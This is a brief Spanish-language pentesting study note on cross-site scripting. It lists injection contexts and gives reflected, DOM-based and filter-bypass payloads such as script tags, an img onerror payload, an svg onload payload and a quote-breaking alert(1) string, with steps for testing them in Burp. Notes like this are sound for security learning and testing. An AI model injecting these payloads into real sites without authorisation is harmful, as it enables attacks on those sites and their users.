## Cross-Site Scripting (XSS)

### Qué es

Ejecución de JavaScript en el navegador de la víctima.

### Contextos (CLAVE)

* HTML
* Atributos
* JavaScript

### Reflejado

```html
<script>alert(1)</script>
```
```js
'-alert(1)-'

--- Explicación

' (Comilla)*: Cierra la cadena de texto original donde se inyecta nuestro valor.

- (Guion): Actúa como un operador de resta. JavaScript intenta restar el resultado de alert(1) a la cadena anterior, lo que obliga a ejecutar la función.

-': El último guion y la comilla reabren una cadena de texto para que el código restante del script original no cause un error de sintaxis y la ejecución se detenga.

---
```


### Stored

Buscar inputs que se guarden (comentarios, perfiles).

### DOM-based

```html
#<img src=x onerror=alert(1)>
```

### Bypass comunes

```html
<img src=x onerror=alert(1)>

"><svg/onload=alert(1)>
```

### Detección con Burp

* Interceptar
* Repetir payload
* Analizar contexto de salida

